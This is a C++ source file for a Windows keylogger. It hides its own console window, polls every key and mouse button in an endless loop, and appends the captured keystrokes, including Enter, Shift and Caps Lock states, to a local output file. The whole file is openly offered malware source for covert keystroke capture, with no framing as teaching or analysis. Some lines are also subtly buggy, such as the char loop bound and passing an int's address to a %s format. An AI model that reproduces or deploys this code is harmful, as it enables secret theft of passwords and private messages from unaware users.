#define PATH "..\\KeyLogger_OUTFILE.txt"  // path to output file location
#define KEY_PRESSED -32767
#include <iostream>
#include <cstdio>
#include <Windows.h>
#include <time.h>
#include <fstream>
void hideConsole();
void showConsole();
void saveToFile(int key_ascii);

int main()
{
	hideConsole();
	while (true)
	{
		Sleep(20);
		for (char i = 8; i <= 255; i++)
			if (GetAsyncKeyState(i) == KEY_PRESSED) // catch keystrokes
			{
				if ((GetKeyState(VK_CAPITAL) & 0x0001) == 0)
					i = tolower(i);
				saveToFile(i);
			}
	}
}

void saveToFile(int key_ascii)
{
	Sleep(20);
	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(PATH, "a+");
	if (OUTPUT_FILE == NULL)
	{
		showConsole();
		std::cout << "Error: cannot open file " << PATH;
	}
	switch (key_ascii)
	{
	case VK_ESCAPE:
		exit(1);
		break;
	case VK_TAB:
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
		break;
	case VK_SPACE:
		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
		break;
	case VK_RETURN:
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
		break;
	case VK_BACK:
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
		break;
	case VK_DELETE:
		fprintf(OUTPUT_FILE, "%s", "[DELETE]");
		break;
	case VK_LCONTROL:
		fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
		break;
	case VK_RCONTROL:
		fprintf(OUTPUT_FILE, "%s", "[RIGHT CONTROL]");
		break;
	case VK_LSHIFT:
		fprintf(OUTPUT_FILE, "%s", "[LEFT SHIFT]");
		break;
	case VK_RSHIFT:
		fprintf(OUTPUT_FILE, "%s", "[RIGHT SHIFT]");
		break;
	case VK_CAPITAL:
		if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK ON]");
		else
			fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK OFF]");
		break;
	case VK_LBUTTON:
		fprintf(OUTPUT_FILE, "%s", "[LEFT MOUSE BUTTON]");
		break;
	case VK_RBUTTON:
		fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
		break;
	default:
		fprintf(OUTPUT_FILE, "%s", &key_ascii);
		break;
	}
	fclose(OUTPUT_FILE);
}

void hideConsole()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void showConsole()
{
	ShowWindow(GetConsoleWindow(), SW_SHOW);
}